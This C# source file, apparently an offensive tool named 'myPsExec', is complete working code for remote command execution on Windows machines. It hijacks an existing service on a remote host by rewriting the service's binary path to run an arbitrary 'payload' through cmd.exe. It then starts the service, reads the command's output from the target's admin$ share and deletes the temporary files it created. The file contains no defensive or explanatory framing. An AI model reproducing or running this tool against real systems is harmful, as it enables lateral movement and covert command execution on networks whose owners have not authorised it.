using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;

namespace myPsExec
{
    public class Program
    {
        [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        const uint SERVICE_NO_CHANGE = 0xffffffff;
        const int SERVICE_DEMAND_START = 0x00000003;
        const int SERVICE_ERROR_IGNORE = 0x00000000;

        public static void MainString(string args)
	{
	    char[] separator = {' '};
	    int count = 3;
            Main(args.Split(separator, count));
	}

	// TODO: make this can be called multiple times?
	static void Execute(string hostname, IntPtr schService, string command)
	{
	    string tmp1 = Guid.NewGuid().ToString("n").Substring(0, 8) + ".bat";
	    string tmp2 = Guid.NewGuid().ToString("n").Substring(0, 8) + ".txt";
	    string tmpBAT = @"%systemroot%\Temp\" + tmp1;
	    string tmpOUT = @"%systemroot%\Temp\" + tmp2;
	    string fullcmd = String.Format(@"%COMSPEC% /C echo {0} ^> {1} > {2} & %COMSPEC% /C start %COMSPEC% /C {3}", command, tmpOUT, tmpBAT, tmpBAT);
	    bool bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, fullcmd, null, null, null, null, null, null);
            if (!bResult) {
                Console.WriteLine(String.Format("Error in calling ChangeServiceConfigA: {0}", GetLastError()));
	    }
            bResult = StartService(schService, 0, null);
            if (!bResult && GetLastError() != 1053) {
                Console.WriteLine(String.Format("Error in calling StartService: {0}", GetLastError()));
	    }

	    Thread.Sleep(1500);

	    // fetch result
	    Console.WriteLine(File.ReadAllText(String.Format(@"{0}\admin$\Temp\{1}", hostname, tmp2)));

	    // cleanup
            File.Delete(String.Format(@"{0}\admin$\Temp\{1}", hostname, tmp1));
            File.Delete(String.Format(@"{0}\admin$\Temp\{1}", hostname, tmp2));
	}

        public static void Main(string[] args)
        {
            string target = @"\\" + args[0];
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F); // SC_MANAGER_ALL_ACCESS
            string ServiceName = args[1];//"SensorService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF); // F01FF SERVICE_ALL_ACCESS

            string payload = args[2];
	    Console.WriteLine(payload);

	    //Execute(target, schService, signature);
	    Execute(target, schService, payload);
        }       
    }
}
